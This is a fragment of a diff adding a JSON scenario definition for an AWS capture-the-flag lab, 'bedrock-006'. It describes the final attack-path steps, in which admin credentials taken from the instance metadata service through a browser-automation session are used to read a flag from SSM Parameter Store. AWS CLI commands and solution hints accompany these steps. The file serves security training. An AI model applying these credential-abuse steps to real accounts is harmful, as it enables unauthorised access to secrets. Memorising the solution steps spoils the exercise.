+            "command": "aws sts get-caller-identity --query 'Arn' --output text"
+          }
+        ],
+        "hints": []
+      },
+      {
+        "from": "target-role",
+        "to": "ctf-flag",
+        "label": "Read CTF flag",
+        "description": "Using the admin credentials extracted from MMDS via the CDP/Playwright session, read the CTF flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all parameters in the account, including the flag at /pathfinding-labs/flags/bedrock-006-to-admin.\n",
+        "commands": [
+          {
+            "description": "Retrieve the CTF flag from SSM Parameter Store",
+            "command": "aws ssm get-parameter --name /pathfinding-labs/flags/bedrock-006-to-admin --query 'Parameter.Value' --output text"
+          }
+        ],
+        "hints": [
+          "You now hold admin-equivalent credentials. The flag is stored in a well-known AWS service for configuration and secrets.",
+          "Use ssm:GetParameter with the scenario-specific parameter name under the /pathfinding-labs/flags/ prefix to retrieve the flag."
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "iam",
+    "bedrock-agentcore"
+  ],
+  "slug": "bedrock-006",
+  "hasDemoTranscript": false
+}
